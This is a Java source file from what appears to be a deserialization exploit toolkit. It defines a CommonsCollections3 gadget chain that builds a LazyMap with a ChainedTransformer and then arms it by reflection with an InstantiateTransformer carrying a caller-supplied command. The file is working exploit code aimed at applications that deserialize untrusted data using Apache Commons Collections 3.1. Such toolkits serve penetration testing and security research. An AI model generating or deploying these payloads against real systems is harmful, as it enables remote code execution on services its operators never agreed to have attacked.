package org.ses.gadgetbuilder.chains1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.ses.gadgetbuilder.adapters.InitializeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.InstantiateGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.singleparam.MapGetTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.FROHOFF })
@Impact(Impact.Instantiate)
public class CommonsCollections3 extends InstantiateGadgetChain<MapGetTrampoline, InitializeAdapter> {

    Transformer transformerChain;
    Transformer[] transformers;


    public CommonsCollections3(MapGetTrampoline _trampoline, InitializeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        // insert chain for setup
        this.transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        this.transformers = new Transformer[] {
                new ConstantTransformer(this.initializeAdapter.getConstructorClass()),
                new InstantiateTransformer(
                        this.initializeAdapter.getParamTypes(),
                        this.initializeAdapter.getParams(command))};

        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        return new TrampolineConnector(lazyMap);
    }

    @Override
    protected void postProcessPayload() throws Exception {
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
    }

    @Override
    protected String getStackTrace() {
        return "org.apache.commons.collections.map.LazyMap.get()\n" +
                "org.apache.commons.collections.functors.InstantiateTransformer.transform()\n" +
                "java.lang.reflect.Method.invoke()";
    }
}
